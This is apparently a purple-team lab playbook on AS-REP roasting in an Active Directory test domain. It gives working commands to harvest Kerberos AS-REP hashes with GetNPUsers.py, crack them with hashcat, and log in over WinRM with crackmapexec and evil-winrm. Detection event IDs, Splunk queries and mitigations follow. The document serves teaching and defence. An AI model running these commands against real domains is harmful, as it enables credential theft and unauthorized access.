# 02) AS-REP Roasting → Lateral → ACL/GPO Abuse
**ATT&CK:** T1558.004 (AS-REP Roasting), T1021 (Remote Services), T1098 (Account Manipulation)  
**Scope:** Authorized lab/assessment only.

## Objective
Identify users with **Do not require Kerberos preauthentication** enabled, obtain crackable AS-REP material, laterally move, and (if misconfig exists) abuse ACL/GPO to escalate impact.

## Environment (assumed)
- **Domain:** `DRAGONBALL.local`
- **DC:** `DC01` — **10.8.10.225**
- **Target host (example):** `SVC01` — **10.8.10.15**
- **Operator box:** `KALI` — **10.8.10.50**

## Procedure (High-Level)
1. Enumerate users with `DONT_REQ_PREAUTH`.  
2. Request AS-REP material and analyze offline.  
3. Validate recovered credentials and attempt lateral movement (WinRM/SMB).  
4. If permissions allow, make controlled changes (e.g., GPO/ACL) **in the lab** to demonstrate risk.

> **Legal/Ethical:** Commands here are for **authorized labs** only.

## Doc-Only Command Examples (authorized lab)
```bash
# 1) Pull AS-REP for users without preauth (users.txt = potential usernames)
GetNPUsers.py DRAGONBALL.local/ -dc-ip 10.8.10.225 -usersfile users.txt -no-pass > asrep.txt

# 2) Offline analysis of AS-REP material
hashcat -m 18200 asrep.txt /wordlists/rockyou.txt

# 3) Validate access / lateral (example host SVC01 over WinRM)
crackmapexec winrm 10.8.10.15 -d DRAGONBALL.local -u <roasted_user> -p '<cracked>'
evil-winrm -i 10.8.10.15 -u <roasted_user> -p '<cracked>'
```
## Telemetry to Collect

- **Kerberos:** **4768/4771** spikes (pre-auth failures/anomalies)
- **Logons:** **4624** (Type **3/10**) from new sources
- **Directory changes:** **5136/5137** (ACL/GPO edits)

## SIEM Analytics (Splunk examples)

```spl
index=wineventlog (EventCode=4768 OR EventCode=4771)
| stats count by TargetUserName, IpAddress
| where count > 50
index=wineventlog (EventCode=5136 OR EventCode=5137)
| stats values(SubjectUserName) values(ObjectName) count by EventCode
| where count > 0
```
## Mitigations

- **Remove** `DONT_REQ_PREAUTH` from all user accounts.
- **Harden passwords:** enforce strong policy; screen for weak/reused passwords; enable **MFA** for high-risk users.
- **Change control:** use **AGPM**, approvals, and alerting on Tier-0/1 objects (**5136/5137**).
- **Monitoring:** watch for unusual **4768/4771** patterns tied to specific users/IPs.
